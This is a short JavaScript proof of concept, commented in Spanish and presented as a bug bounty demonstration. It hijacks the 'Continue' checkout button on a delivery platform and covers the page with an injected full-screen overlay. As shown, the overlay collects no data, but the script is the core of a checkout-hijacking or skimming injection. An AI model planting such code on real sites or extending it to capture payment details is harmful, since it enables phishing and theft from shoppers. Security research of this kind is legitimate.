// PoC: Captura de botón de pago en plataforma de delivery
(function() {
    console.log("Investigación activa: Buscando botón 'Continue'...");

    // Usamos el data-testid que es el selector más específico para este botón
    const selector = 'a[data-testid="CheckoutButton"]';

    const checkButton = setInterval(() => {
        const continueBtn = document.querySelector(selector);

        if (continueBtn) {
            console.log("Botón detectado. Aplicando intercepción...");
            clearInterval(checkButton);

            continueBtn.addEventListener('click', function(e) {
                // Bloqueamos la redirección real al checkout
                e.preventDefault();
                e.stopImmediatePropagation();

                // Aquí se dispararía tu interfaz de prueba (Overlay)
                console.log("Evento interceptado con éxito.");
                mostrarInterfazPrueba();
            });
        }
    }, 500);

    function mostrarInterfazPrueba() {
        // Tu lógica de inserción de HTML para demostrar el impacto de PII
        const div = document.createElement('div');
        div.innerHTML = `
            <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:999999;padding:40px;font-family:sans-serif;">
                <h2>Confirmación de Pedido (PoC de Seguridad)</h2>
                <p>Esta es una demostración de seguridad para el reporte de Bug Bounty.</p>
                <button onclick="location.reload()" style="padding:10px 20px; background:black; color:white; border:none; cursor:pointer;">
                    Cerrar Prueba
                </button>
            </div>`;
        document.body.appendChild(div);
    }
})();
